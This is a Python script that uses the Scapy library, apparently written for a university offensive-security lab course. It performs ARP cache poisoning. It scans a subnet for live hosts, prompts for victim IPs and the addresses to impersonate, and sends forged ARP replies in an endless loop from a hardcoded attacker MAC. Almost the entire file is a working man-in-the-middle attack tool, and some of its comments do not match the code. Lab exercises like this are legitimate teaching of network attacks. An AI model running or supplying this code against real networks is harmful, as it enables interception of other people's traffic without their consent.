from scapy.all import * 

print ( '\033[95m' +"        2IC80 Lab on offensive computer security        ")
print ( '\033[95m' +"                Group 44 2021/2022 TU/e                 ")
print ( '\033[0m'  +"--------------------------------------------------------")

def spoofedPkt(macVictim, ipVictim, ipToSpoof):
    arp= Ether() / ARP()
    arp[Ether].src = macAttacker
    arp[ARP].hwsrc = macAttacker        
    arp[ARP].psrc = ipToSpoof            
    arp[ARP].hwdst = macVictim
    arp[ARP].pdst = ipVictim           

    sendp(arp, inter = 60, loop = 1, iface="enp0s9") # inter -> 60 sec to wait between 2 pkts

def gratutiousARP(macVictim, ipVictim, ipToSpoof):
    #arp response that was not prompt by arp request
    arp= Ether() / ARP()
    arp[Ether].src = macAttacker
    arp[ARP].hwsrc = macAttacker        
    arp[ARP].psrc = ipToSpoof            
    arp[ARP].hwdst = macVictim
    arp[ARP].pdst = ipVictim 
    arp[ARP].op = "is-at"
    print("MacVictim: ", macVictim)
    
    sendp(arp, inter = 60, loop = 1, iface="enp0s9") # inter -> 60 sec to wait between 2 pkts
    

#ping all host with IPs between 192.168.56.99-103
#hosts = sr(IP(dst = "192.168.56.100/30")/ICMP(), timeout=2) 

hosts = arping("10.0.2.0/24") #checks which IPs in the range: 192.168.56.100-108 are up
dictIPMAC = {}
for i in range(len(hosts[0])): #hosts[0] contains the answers form the hosts that are up
    dictIPMAC[hosts[0][i][1][ARP].psrc] = hosts[0][i][1][ARP].hwsrc
    print("Host ", hosts[0][i][1][ARP].psrc, "is up") #52:54:00:12:35:00
    
print ( '\033[0m'  +"--------------------------------------------------------")
print("How many hosts arp tables do you want to spoof: ")
inputNumber = int(input())

ipVictims = []
ipsToBeSpoofed = []
for i in range(inputNumber):
    print("Insert the IP of victim ", i, " (Press Enter)")
    ipVictim = raw_input()    
    ipVictims.append(ipVictim)
    print("Insert the IP that will be spoofed in victims arp table")
    ipToBeSpoof = raw_input()
    ipsToBeSpoofed.append(ipToBeSpoof)

print("You want to poision the arp tables of ", ipVictims)

#shouldn't we make this automatic to make it work on multiple systems?
macAttacker = "08:00:27:96:ae:0b"            
ipAttacker = "10.0.2.5"

for i in range(len(ipVictims)):
    macVictim = dictIPMAC[ipVictims[i]]
    ipVictim = ipVictims[i]
    ipToSpoof = ipsToBeSpoofed[i]
    #spoofedPkt(macVictim, ipVictim, ipToSpoof)
    # gratutiousARP(macVictim, ipVictim, ipToSpoof)
    spoofedPkt(macVictim, ipVictim, ipToSpoof)

#print("ARP poisoning of: " + ipVictims + " complete!")
